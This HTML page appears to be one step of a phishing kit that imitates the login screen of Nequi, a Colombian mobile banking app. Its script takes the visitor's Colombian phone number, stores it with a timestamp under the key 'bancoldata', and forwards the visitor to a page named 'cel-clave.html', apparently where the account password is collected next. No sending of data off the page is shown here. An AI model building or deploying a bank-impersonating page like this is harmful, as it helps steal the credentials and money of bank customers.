<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ingreso</title>

  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Arial, sans-serif;
      background: #200020;
      display: flex;
      justify-content: center;
      min-height: 100vh;
      color: white;
    }

    .container {
      width: 100%;
      max-width: 420px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      height: 100vh;
    }

    /* HEADER */
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .help-icon {
      width: 22px;
      height: 22px;
      border: 2px solid white;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 14px;
      font-weight: bold;
    }

    /* LOGO */
    .logo {
      margin-top: auto;
      text-align: center;
      font-size: 48px;
      font-weight: 600;
      letter-spacing: 1px;
    }

    .logo-box {
      display: inline-block;
      width: 12px;
      height: 12px;
      background: #ff008c;
      margin-right: 6px;
      border-radius: 2px; /* cuadradito */
      transform: translateY(-4px);
    }

    /* FORM */
    .form {
      margin-top: auto;
    }

    .input-box {
      background: rgba(255,255,255,0.15);
      border-radius: 8px;
      padding: 10px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .prefix {
      border-right: 2px solid rgba(255,255,255,0.3);
      padding-right: 10px;
      font-weight: bold;
      color: #ff66c4;
    }

    .input-box input {
      flex: 1;
      border: none;
      outline: none;
      background: transparent;
      color: white;
      font-size: 16px;
    }

    .input-box input::placeholder {
      color: #ccc;
    }

    .btn {
      margin-top: 15px;
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      background: #ff008c;
      color: white;
      font-size: 16px;
      cursor: pointer;
      opacity: 0.4;
      transition: 0.3s;
    }

    .btn.active {
      opacity: 1;
    }

    svg {
      color: #ccc;
    }
  </style>
</head>

<body>

<div class="container">

  <!-- HEADER -->
  <header>
    <div class="help-icon">?</div>

    <div>
      <!-- ICONO SUPERIOR -->
      <svg width="70px" height="24px" viewBox="0 0 118 40">
        <g>
          <path fill="currentColor" d="M83.59,23.13c0.21,0.14,0.35,0.35,0.42,0.59l0.85,2.73..."></path>
        </g>
      </svg>
    </div>
  </header>

  <!-- LOGO CENTRO -->
  <div class="logo">
    <span class="logo-box"></span>Nequi
  </div>

  <!-- FORM -->
  <div class="form">
    <div class="input-box">
      <div class="prefix">+57</div>
      <input type="text" id="phoneInput" placeholder="Ingresa tu cel" maxlength="12">
    </div>

    <button class="btn" id="btn">Entra</button>
  </div>

</div>

<script>
const input = document.getElementById("phoneInput");
const btn = document.getElementById("btn");

function formatNumber(value) {
  let digits = value.replace(/\D/g, "");
  if (digits.length > 10) digits = digits.slice(0, 10);

  if (digits.length > 6) {
    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  } else if (digits.length > 3) {
    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }
  return digits;
}

input.addEventListener("input", () => {
  input.value = formatNumber(input.value);

  const digits = input.value.replace(/\D/g, "");

  if (digits.length === 10 && digits.startsWith("3")) {
    btn.classList.add("active");
  } else {
    btn.classList.remove("active");
  }
});

btn.addEventListener("click", () => {
  const raw = input.value.replace(/\D/g, "");

  if (raw.length !== 10 || !raw.startsWith("3")) {
    alert("Número inválido");
    return;
  }

  let data = {};
  try {
    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
  } catch {
    data = {};
  }

  data.numero = raw;
  data.fecha = new Date().toISOString();

  localStorage.setItem("bancoldata", JSON.stringify(data));

  window.location.href = "cel-clave.html";
});
</script>

</body>
</html>
